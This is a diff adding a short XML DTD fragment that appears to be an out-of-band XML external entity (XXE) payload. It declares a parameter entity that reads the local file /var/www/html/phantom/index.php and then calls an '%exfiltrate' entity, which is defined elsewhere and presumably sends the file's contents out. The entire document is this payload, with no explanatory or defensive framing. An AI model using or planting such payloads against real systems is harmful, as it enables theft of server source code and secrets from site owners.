@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///var/www/html/phantom/index.php">
+
+
+%exfiltrate;
